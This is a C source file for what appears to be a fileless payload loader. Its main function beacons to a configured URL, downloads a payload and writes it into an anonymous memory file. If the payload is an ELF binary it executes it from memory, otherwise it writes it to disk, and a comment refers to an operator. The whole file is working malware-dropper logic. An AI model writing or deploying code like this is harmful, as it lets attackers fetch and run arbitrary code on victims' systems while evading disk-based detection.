#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include "detect.h"
#include "helpers.h"
#include "networking.h"
#include "preferences.h"

int main(int argc, char **argv)
{
    struct MemoryStruct payload;
    void *decrypted;
    void *decompressed;
    int payloadFD; // in memory file descriptor
    int writeReturnSize;
    int d;                               //to hold the return value of detect()
    char *payload_argv[] = PAYLOAD_ARGV; // argv for payload
    char *payload_envp[] = PAYLOAD_ENVP; // envp for payload
    char *pathToWrite = PATH_TO_WRITE;

    payload = beacon(PAYLOAD_URL);

    while ((payloadFD = memfd_create("payload", 0)) <= 2)
    { // create memory file descriptor for execution
        printf("memfd_create() failed. File descriptor created: %d\n", payloadFD);
        close(payloadFD);
        return -1;
    }

    writeReturnSize = write(payloadFD, payload.memory, payload.size); // write to mem_fd and error check
    if (writeReturnSize != payload.size)
    {
        printf("Writing to mem_fd failed. %d bytes written when %d bytes were supposed to be written.\n", writeReturnSize, (int)payload.size);
        return -1;
    }

    d = detect((unsigned char *)payload.memory); //determine if the payload is an executable/ELF

    if (d == 1)
    {
        if (executePayload(payloadFD, payload_argv, payload_envp) == 0)
        {
            //send message to operator
            return -1;
        }
    }
    else
    {
        writeToDisk(payload.memory, pathToWrite, payload.size);
    }

    return 0;
}